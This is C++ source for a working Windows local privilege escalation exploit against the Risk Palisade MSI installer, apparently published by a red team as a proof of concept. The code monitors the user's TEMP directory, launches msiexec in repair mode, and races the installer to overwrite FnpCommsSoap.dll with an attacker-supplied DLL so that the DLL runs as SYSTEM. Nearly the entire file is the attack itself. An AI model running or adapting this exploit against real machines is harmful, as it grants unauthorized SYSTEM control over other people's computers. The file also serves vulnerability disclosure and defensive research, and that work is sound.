#include <windows.h>
#include <winbase.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>
#include <strsafe.h>
#include <pathcch.h>
#include <Shlwapi.h>
#include<iostream>
#include<fstream>
#pragma comment(lib, "Pathcch.lib")
#pragma comment(lib, "Shlwapi.lib")
#include "stdafx.h"


// This is Risk Palisade installer race condition LPE exploit.
// Developed by Julian Horoszkiewicz and Pawel Karwowski (Eviden Red Team).
// Code based on https://learn.microsoft.com/en-us/windows/win32/fileio/obtaining-directory-change-notifications and https://learn.microsoft.com/en-us/windows/win32/fileio/listing-the-files-in-a-directory, FileOplock code taken from Google's https://github.com/googleprojectzero/symboliclink-testing-tools

// The algorithm is pretty simple and goes like this:
// 1. Set up a watch notification on AppData\Local\Temp (to detect new directory creation)
// 2. Once notification hits, iterate over results. In our version the directory is always named {BBE13EB0-40BE-4D09-8BEA-9C0053E9580A}, 
// however I am assuming it might differ across versions. Thus, we'll simply go for any directory 38-characters long.
// 3. We scan for the vuln dll file existence (just a scan in a loop) in the directory (we are implementing 32 bit version here only). Changing this exploit to 
// support x86 is as simple as changing this subdirectory name and recompiling raw.cpp to an x86 version.
// 4. Once presence of the file is confirmed, we attempt to overwrite it until we succeed (first attempts will most likely fail due to sharing violation - the file will be written
// by the MSI installer executable at the time.
// 5. After we succeed with our overwrite, we sleep for 10 seconds and check for the existence of C:\Users\Public\poc.txt.

void RefreshDirectory(LPTSTR);
void RefreshTree(LPTSTR);
void WatchTempDirectory(LPTSTR);
void WatchAndRaceTempFile(LPTSTR);
void deploy_payload(LPTSTR);


HANDLE hFind = INVALID_HANDLE_VALUE;
HANDLE hFind2 = INVALID_HANDLE_VALUE;
HANDLE hFind3 = INVALID_HANDLE_VALUE;
HANDLE hFind4 = INVALID_HANDLE_VALUE;
TCHAR LOCALAPPDATA[MAX_PATH];

TCHAR Palisade_TEMP_DIRNAME[MAX_PATH];
TCHAR DLL_PATH[MAX_PATH];
TCHAR DLL_COPY_PATH[MAX_PATH];
TCHAR DLL_DEPLOY_PATH[MAX_PATH];
TCHAR CURRENT_DIR[MAX_PATH];
TCHAR Palisade_TEMP_DIRMASK[MAX_PATH];
TCHAR Palisade_MSI_FILE[MAX_PATH];
TCHAR MSIEXEC_COMMAND_LINE[MAX_PATH];
TCHAR ORIG_DLL_PATH[MAX_PATH];

WIN32_FIND_DATA ffd3;
WIN32_FIND_DATA ffd4;
DWORD dwError = 0;

char* DLL_BUFFER;
int WRITE_ATTEMPT_COUNT = 0;
int THREAD_COUNT = 0;
int MAX_OVERWRITE_ATTEMPTS = 250;
int SCAN_FAIL_COUNT = 0;
int SCAN_FAIL_MAX = 100;
int FILE_CHECK_COUNT = 0;
int MAX_FILE_CHECK_COUNT = 500;
size_t DLL_BUFF_LENGTH = 0;

void _tmain(int argc, TCHAR* argv[])
{
    if (argc != 2)
    {
        _tprintf(TEXT("\nUsage: %s PATH_TO_Palisade_INSTALLER_FILE.msi\n\n"), argv[0]);
        ExitProcess(1);
    }

    if (!PathFileExists(argv[1])) // check if the provided file exists
    {
        _tprintf(TEXT("\nFatal: provided %s MSI file does not exist!\n\n"), argv[1]);
        ExitProcess(1);
    }
    StringCchCopy(Palisade_MSI_FILE, MAX_PATH, argv[1]);
    _tprintf(TEXT("\nObtaining the TEMP environmental variable... "));
    GetEnvironmentVariable(TEXT("TEMP"), LOCALAPPDATA, MAX_PATH); // C:\Users\user\AppData\Local\Temp is what we're looking for
    _tprintf(TEXT("Done: "));
    _tprintf(TEXT("\nPress any key to start the exploitation process... \n"));
    DeleteFile(TEXT("C:\\Users\\Public\\poc.txt")); // remnove old poc.txt if exists...
//  scanning for the Palisade temporary installer directory (then run the installer in repair mode in a separate window...
    char g;
    getc(stdin);

    // READ THE raw.dll file into memory
    _tprintf(TEXT("Loading the dll into memory...\n"));
    size_t path_len = 0;
    GetModuleFileName(NULL, CURRENT_DIR, MAX_PATH);
    StringCchLengthW(CURRENT_DIR, MAX_PATH, &path_len);
    PathCchRemoveFileSpec(CURRENT_DIR, path_len);
    StringCchCat(DLL_PATH, MAX_PATH, CURRENT_DIR);
    StringCchCat(DLL_PATH, MAX_PATH, TEXT("\\FnpCommsSoap.dll"));

    StringCchCopy(Palisade_TEMP_DIRMASK, MAX_PATH, LOCALAPPDATA);
    StringCchCat(Palisade_TEMP_DIRMASK, MAX_PATH, TEXT("\\{*"));
    
    HANDLE fileHandle = CreateFile(DLL_PATH, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        _tprintf(TEXT("\nFatal: failed to open %s DLL file for reading!"),DLL_PATH);
        ExitProcess(1);
    }
    // Get the file size
    DLL_BUFF_LENGTH = GetFileSize(fileHandle, NULL);
    // Read the file contents into a buffer
    DLL_BUFFER = new char[DLL_BUFF_LENGTH];
    DWORD bytesRead;
    if (!ReadFile(fileHandle, DLL_BUFFER, DLL_BUFF_LENGTH, &bytesRead, NULL)) {
        _tprintf(TEXT("\nFailed to read the %s DLL file!"),DLL_PATH);
        delete[] DLL_BUFFER;
        CloseHandle(fileHandle);
        ExitProcess(1);
    }
    _tprintf(TEXT("Done (%dw bytes of DLL file read, file size and DLL_BUFFER size: %d).\nStarting to watch for directory changes."), bytesRead, DLL_BUFF_LENGTH);
  
    // Start the installer, watch the AppData\Local\TempMoved for changes - once the first ns* directory is created, create a phantom in AppData\Local\TempNew, deploy StdUtils.dll and switch the path by removing and recreating the directory junction.
    WatchTempDirectory(LOCALAPPDATA);
}
void start_msiexec()
{
    StringCchCopy(MSIEXEC_COMMAND_LINE, MAX_PATH, TEXT("msiexec.exe /fa "));
    StringCchCat(MSIEXEC_COMMAND_LINE, MAX_PATH, Palisade_MSI_FILE);
    _tprintf(TEXT("Starting %s...\n"), MSIEXEC_COMMAND_LINE);
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));


    // Start the child process. 
    if (!CreateProcess(NULL,   // No module name (use command line)
        MSIEXEC_COMMAND_LINE,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
        )
    {
        printf("CreateProcess failed (%d). Exiting!\n", GetLastError());
        ExitProcess(1);
    }
    // We do not wait for the child process to end, we move on towards exploitation.
    // *
    // WaitForSingleObject(pi.hProcess, INFINITE);
    // Close process and thread handles. 
    //CloseHandle(pi.hProcess);
    //CloseHandle(pi.hThread);
    // */
    _tprintf(TEXT("Done...\n"));
}
void WatchTempDirectory(LPTSTR lpDir) // C:\Users\kate\AppData\Local\Temp
{
   _tprintf(TEXT("Starting to watch %s.\n"),lpDir);
   BOOL target_found = FALSE;
// Watch the subtree for directory creation and deletion. 
// https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstchangenotificationa
   DWORD dwWaitStatus; 
   HANDLE dwChangeHandle; 

   dwChangeHandle = FindFirstChangeNotificationW(lpDir, FALSE, FILE_NOTIFY_CHANGE_DIR_NAME); // watch file name changes
   if(dwChangeHandle == INVALID_HANDLE_VALUE) 
   {
     printf("\n ERROR: FindFirstChangeNotification function failed.\n");
     ExitProcess(GetLastError()); 
   }
   if(dwChangeHandle == NULL)
   {
     printf("\n ERROR: Unexpected NULL from FindFirstChangeNotification.\n");
     ExitProcess(GetLastError()); 
   }
   _tprintf(TEXT("\nDIR being watched: %s\n"), lpDir);
   start_msiexec(); // STARTING MSIEXEC PROCESS
   //printf("\nStarting f filesystem notification...\n");
  /*
   dwWaitStatus = WaitForSingleObject(dwChangeHandle, INFINITE); // catch first change notification when the MSI* temp directory is created, then ignore it and set up another notification
   if (dwWaitStatus != WAIT_OBJECT_0)
   {
       _tprintf(TEXT("\nError (dwWaitStatus: %d) when trying to catch directory creation event in %s, this should not happen, exiting...\n"), lpDir);
       ExitProcess(GetLastError());
   }
   _tprintf(TEXT("\nFirst change notification for %s received (most likely the temporary MSI* directory was created), ignoring and setting another watch notification)...\n"), lpDir);
    */
   dwChangeHandle = FindFirstChangeNotificationW(lpDir, FALSE, FILE_NOTIFY_CHANGE_DIR_NAME); // watch file name changes
   if (dwChangeHandle == INVALID_HANDLE_VALUE)
   {
       printf("\n ERROR: FindFirstChangeNotification function failed.\n");
       ExitProcess(GetLastError());
   }
   if (dwChangeHandle == NULL)
   {
       printf("\n ERROR: Unexpected NULL from FindFirstChangeNotification.\n");
       ExitProcess(GetLastError());
   }
   dwWaitStatus = WaitForSingleObject(dwChangeHandle, INFINITE); // catch the second change notification - this is when our target{BBE13EB0-40BE-4D09-8BEA-9C0053E9580A} is created
   if (dwWaitStatus != WAIT_OBJECT_0)
   {
       _tprintf(TEXT("\nError (dwWaitStatus: %d) when trying to catch directory creation event in %s, this should not happen, exiting...\n"), lpDir);
       ExitProcess(GetLastError());
   }
   _tprintf(TEXT("\nChange notification for %s received (most likely the temporary 38-char directory was created), starting to watch for the FnpCommsSoap.dll file...\n"), lpDir);

   while (target_found==FALSE && SCAN_FAIL_COUNT<SCAN_FAIL_MAX) 
   { 
      // Wait for notification.      
      //printf("Got some!\n");
      //_tprintf(TEXT("Looking for %s directory...\n"), Palisade_TEMP_DIRMASK);
      switch (dwWaitStatus) 
      { 
         case WAIT_OBJECT_0: 
             //printf("A directory was created, renamed, or deleted.\n"); // OK, this is working, so far so good!
             // now, check if it appears to be a Palisade temp directory (based on the prefix), and if so - dive into watching it - or maybe even scan it for files already without waiting for further notifications (if our first approach fails, we will attempt to remove the directory already at this stage)

             hFind3 = FindFirstFile(Palisade_TEMP_DIRMASK, &ffd3); // iterate over everything - this is bad strategy for race conditions, especially since we already know the name
             // however the name seems to be so random that it might differ across versions, so we wanna take more universal approach and attack any directory that is 39-character long
             if (INVALID_HANDLE_VALUE == hFind3) // I think this might happen if we get a notification caused by a third-party interference (other directory created, with a different prefix) - take this into account in error handling
             {
                 SCAN_FAIL_COUNT++;
                _tprintf(TEXT("INVALID_HANDLE received from FindFirstNotification, ignoring for the %d time..."),SCAN_FAIL_COUNT); // 
                continue;
             }
             // List all the files in the directory with some info about them.
            do
            {
                _tprintf(TEXT("Processing entry: ")); // DEBUG
                _tprintf(ffd3.cFileName); // DEBUG
                _tprintf(TEXT("\n")); // DEBUG
                if ((ffd3.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && lstrlen(ffd3.cFileName) == 38) // if it's a directory - which is what we want
                {
                    target_found = TRUE;
                    StringCchCopy(Palisade_TEMP_DIRNAME, MAX_PATH, LOCALAPPDATA);
                    StringCchCat(Palisade_TEMP_DIRNAME, MAX_PATH, TEXT("\\"));
                    StringCchCat(Palisade_TEMP_DIRNAME, MAX_PATH, ffd3.cFileName);                    
                    _tprintf(TEXT("Discovered 38-character directory named %s, good.\n"),Palisade_TEMP_DIRNAME);
                    StringCchCopy(DLL_DEPLOY_PATH, MAX_PATH, Palisade_TEMP_DIRNAME);
                    StringCchCat(DLL_DEPLOY_PATH, MAX_PATH, TEXT("\\"));
                    StringCchCat(DLL_DEPLOY_PATH, MAX_PATH, TEXT("FnpCommsSoap.dll")); 
                    StringCchCopy(ORIG_DLL_PATH, MAX_PATH, Palisade_TEMP_DIRNAME);
                    StringCchCat(ORIG_DLL_PATH, MAX_PATH, TEXT("\\"));
                    StringCchCat(ORIG_DLL_PATH, MAX_PATH, TEXT("bak-FnpCommsSoap.dll"));
                    CopyFile(TEXT("bak-FnpCommsSoap.dll"),ORIG_DLL_PATH, FALSE);
                    deploy_payload(DLL_DEPLOY_PATH);
                }
            } while (FindNextFile(hFind3, &ffd3) != 0);
            dwError = GetLastError();
            if (dwError != ERROR_NO_MORE_FILES)
            {
                _tprintf(TEXT("\nERROR_NO_MORE_FILES\n\n"));
            }
            FindClose(hFind3);
            if (target_found == FALSE) // if our target directory still was not found - this might happen if we scan the directory too early
            {
                SCAN_FAIL_COUNT++;
                _tprintf(TEXT("Could not find the target directory, repeating the loop for the %d time..."), SCAN_FAIL_COUNT); // 
                continue;
            }
            // target was found and attacked, process can exit
            printf("Exiting.\n");
            ExitProcess(dwError); //
            break; 
         case WAIT_TIMEOUT:
         // A timeout occurred, this would happen if some value other 
         // than INFINITE is used in the Wait call and no changes occur.
         // In a single-threaded environment you might not want an
         // INFINITE wait.
            printf("\nNo changes in the timeout period (this should not happen, as we passed INIFINITE to WaitForSingleObject().\n");
            break;
         default: 
            printf("\n ERROR: Unhandled dwWaitStatus.\n");
            ExitProcess(GetLastError());
            break;
      }
   }
}
void deploy_payload(LPTSTR target_filename) // second version, let's try writing into it, hopefully this will be faster than trying to replace the file instead...
{
    WRITE_ATTEMPT_COUNT = 0;
    FILE_CHECK_COUNT = 0;
    while(WRITE_ATTEMPT_COUNT<MAX_OVERWRITE_ATTEMPTS)
    {
        if (!PathFileExists(target_filename))
        {            
            FILE_CHECK_COUNT++;
            if (FILE_CHECK_COUNT > MAX_FILE_CHECK_COUNT)
            {
                _tprintf(TEXT("Exceeded %d while waiting for the target file %s to be created. Looks like something's wrong with the installer. Exiting.\n"),MAX_FILE_CHECK_COUNT,target_filename);
                ExitProcess(1);
            }
            continue; // do nothing as long as the file does not appear - we cannot overwrite it too early, we must start our attempts AFTER it is created by the installer process
        }
        WRITE_ATTEMPT_COUNT++;

        HANDLE outFile = CreateFile(target_filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(outFile == INVALID_HANDLE_VALUE)
        {
            
            _tprintf(TEXT("Failed to write the %s file (%d attempt)!\n"),target_filename,WRITE_ATTEMPT_COUNT); // since we are now writing into our own new directory, this should not happen
            continue;
        }
        // Write binary data to the file
        DWORD bytesWritten;
        if(!WriteFile(outFile, DLL_BUFFER, DLL_BUFF_LENGTH, &bytesWritten, NULL)) 
        {
            _tprintf(TEXT("Failed to write into %s file!\n"),target_filename);
            CloseHandle(outFile);
        }
        else
        {
            _tprintf(TEXT("File %s overwritten (%d bytes written)!\n"), target_filename, bytesWritten);
            CloseHandle(outFile);
            break; // having this successfully file overwritten once should do the trick, further attempts will only thwart the exploitation process by
            // potentially triggering SHARING VIOLATION errors to the installer
        }
    }
    // we could add a routine checking for C:\Users\Public\poc.txt here
    _tprintf(TEXT("Sleeping 50 seconds before checking for poc.txt...\n"));
    Sleep(50000);
    if (PathFileExists(TEXT("C:\\Users\\Public\\poc.txt")))
    {
        printf("\n\nGOT SYSTEM BABY!!! C:\\Users\\Public\\poc.txt was created!\n\n");
        printf("\n\nFollowing is the POC file contents:\n\n");
        for (std::ifstream file("C:\\Users\\Public\\poc.txt"); std::cout << file.rdbuf(); file.close());
    }
    else
    {
        printf("We must have won the condition too early or lost it (overwritten the file too late)! Wait until installer finishes and try again, or rewrite the goddamn exploit!\n");
    }
    ExitProcess(0); // exit all threads, we're done here - if we failed to get SYSTEM after first overwrite, we have failed and there is no reason to try again
}
